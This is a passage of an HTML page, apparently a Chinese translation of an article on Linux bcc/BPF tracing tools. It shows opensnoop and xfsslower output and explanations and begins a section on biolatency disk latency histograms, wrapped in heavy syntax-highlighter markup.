class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbdf937419311-4\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libmagic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-5\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbdf937419311-6\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libc</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-7\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbdf937419311-8\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">file</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">mgc</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-9\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">magic</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbdf937419311-10\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">misc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">mgc</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-11\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">gconv</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">gconv</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">modules</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbdf937419311-12\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-13\"><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">      </span><span class=\"crayon-i\">systemd</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">565</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">cgroup</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbdf937419311-14\"><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">      </span><span class=\"crayon-i\">systemd</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">536</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">cgroup</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-15\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0044 seconds] -->\r\n<p>像 <code>execsnoop</code> 和 <code>opensnoop</code> 这样的工具会将每个事件打印一行。上图显示 <code>file(1)</code> 命令当前打开（或尝试打开）的文件：返回的文件描述符（“FD” 列）对于 <code>/etc/magic.mgc</code> 是 -1，而 “ERR” 列指示它是“文件未找到”。我不知道该文件，也不知道 <code>file(1)</code> 正在读取的 <code>/usr/share/misc/magic.mgc</code> 文件是什么。我不应该感到惊讶，但是 <code>file(1)</code> 在识别文件类型时没有问题：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbe4918862184\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# file /usr/share/misc/magic.mgc /etc/magic\r\n/usr/share/misc/magic.mgc: magic binary file for file(1) cmd (version 14) (little endian)\r\n/etc/magic:                magic text file for file(1) cmd, ASCII text\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe4918862184-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe4918862184-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe4918862184-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe4918862184-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe4918862184-1\"><span class=\"crayon-p\"># file /usr/share/misc/magic.mgc /etc/magic</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe4918862184-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">misc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">mgc</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">magic </span><span class=\"crayon-e\">binary </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cmd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">version</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">little </span><span class=\"crayon-v\">endian</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe4918862184-3\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">magic</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">magic </span><span class=\"crayon-e\">text </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cmd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ASCII </span><span class=\"crayon-i\">text</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe4918862184-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><code>opensnoop</code> 通过跟踪 <code>open()</code> 系统调用来工作。为什么不使用 <code>strace -feopen file</code> 命令呢？ 在这种情况下是可以的。然而，<code>opensnoop</code> 的一些优点在于它能在系统范围内工作，并且跟踪所有进程的 <code>open()</code> 系统调用。注意上例的输出中包括了从 systemd 打开的文件。<code>opensnoop</code> 应该系统开销更低：BPF 跟踪已经被优化过，而当前版本的 <code>strace(1)</code> 仍然使用较老和较慢的 <code>ptrace(2)</code> 接口。</p>\n<h4 id=\"toc_4\">3、 xfsslower</h4>\n<p>bcc/BPF 不仅仅可以分析系统调用。<a href=\"https://github.com/iovisor/bcc/blob/master/tools/xfsslower.py\">xfsslower</a> 工具可以跟踪大于 1 毫秒（参数）延迟的常见 XFS 文件系统操作。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbe8543087568\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/xfsslower 1\r\nTracing XFS operations slower than 1 ms\r\nTIME     COMM           PID    T BYTES   OFF_KB   LAT(ms) FILENAME\r\n14:17:34 systemd-journa 530    S 0       0           1.69 system.journal\r\n14:17:35 auditd         651    S 0       0           2.43 audit.log\r\n14:17:42 cksum          4167   R 52976   0           1.04 at\r\n14:17:45 cksum          4168   R 53264   0           1.62 [\r\n14:17:45 cksum          4168   R 65536   0           1.01 certutil\r\n14:17:45 cksum          4168   R 65536   0           1.01 dir\r\n14:17:45 cksum          4168   R 65536   0           1.17 dirmngr-client\r\n14:17:46 cksum          4168   R 65536   0           1.06 grub2-file\r\n14:17:46 cksum          4168   R 65536   128         1.01 grub2-fstest\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe8543087568-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe8543087568-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe8543087568-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe8543087568-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe8543087568-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe8543087568-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe8543087568-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe8543087568-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe8543087568-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe8543087568-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe8543087568-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe8543087568-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbe8543087568-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbe8543087568-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe8543087568-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/xfsslower 1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe8543087568-2\"><span class=\"crayon-e\">Tracing </span><span class=\"crayon-e\">XFS </span><span class=\"crayon-e\">operations </span><span class=\"crayon-e\">slower </span><span class=\"crayon-i\">than</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe8543087568-3\"><span class=\"crayon-e\">TIME     </span><span class=\"crayon-e\">COMM           </span><span class=\"crayon-i\">PID</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BYTES   </span><span class=\"crayon-e\">OFF_KB   </span><span class=\"crayon-e\">LAT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ms</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">FILENAME</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe8543087568-4\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">systemd</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">journa</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">530</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.69</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">system</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">journal</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe8543087568-5\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">auditd</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">651</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">2.43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">audit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">log</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe8543087568-6\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4167</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">52976</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.04</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">at</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe8543087568-7\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">53264</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.62</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe8543087568-8\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.01</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">certutil</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe8543087568-9\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.01</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dir</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe8543087568-10\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.17</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dirmngr</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">client</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe8543087568-11\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">46</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">           </span><span class=\"crayon-cn\">1.06</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grub2</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe8543087568-12\"><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">46</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cksum</span><span class=\"crayon-h\">          </span><span class=\"crayon-cn\">4168</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">128</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">1.01</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grub2</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">fstest</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbe8543087568-13\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbe8543087568-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0087 seconds] -->\r\n<p>在上图输出中，我捕获到了多个延迟超过 1 毫秒 的 <code>cksum(1)</code> 读取操作（字段 “T” 等于 “R”）。这是在 <code>xfsslower</code> 工具运行的时候，通过在 XFS 中动态地检测内核函数实现的，并当它结束的时候解除该检测。这个 bcc 工具也有其它文件系统的版本：<code>ext4slower</code>、<code>btrfsslower</code>、<code>zfsslower</code> 和 <code>nfsslower</code>。</p>\n<p>这是个有用的工具，也是 BPF 追踪的重要例子。对文件系统性能的传统分析主要集中在块 I/O 统计信息 —— 通常你看到的是由 <code>iostat(1)</code> 工具输出，并由许多性能监视 GUI 绘制的图表。这些统计数据显示的是磁盘如何执行，而不是真正的文件系统如何执行。通常比起磁盘来说，你更关心的是文件系统的性能，因为应用程序是在文件系统中发起请求和等待。并且，文件系统的性能可能与磁盘的性能大为不同！文件系统可以完全从内存缓存中读取数据，也可以通过预读算法和回写缓存来填充缓存。<code>xfsslower</code> 显示了文件系统的性能 —— 这是应用程序直接体验到的性能。通常这对于排除整个存储子系统的问题是有用的；如果确实没有文件系统延迟，那么性能问题很可能是在别处。</p>\n<h4 id=\"toc_5\">4、 biolatency</h4>\n<p>虽然文件系统性能对于理解应用程序性能非常重要，但研究磁盘性能也是有好处的。当各种缓存技巧都无法挽救其延迟时，磁盘的低性能终会影响应用程序。 磁盘性能也是容量规划研究的目标。</p>\n<p><code>iostat(1)</code> 工具显示了平均磁盘 I/O 延迟，但平均值可能会引起误解。 以直方图的形式研究 I/O 延迟的分布是有用的，这可以通过使用 [biolatency] 来实现<a href=\"https://github.com/iovisor/bcc/blob/master/tools/biolatency.py\">18</a>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbed230877010\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div 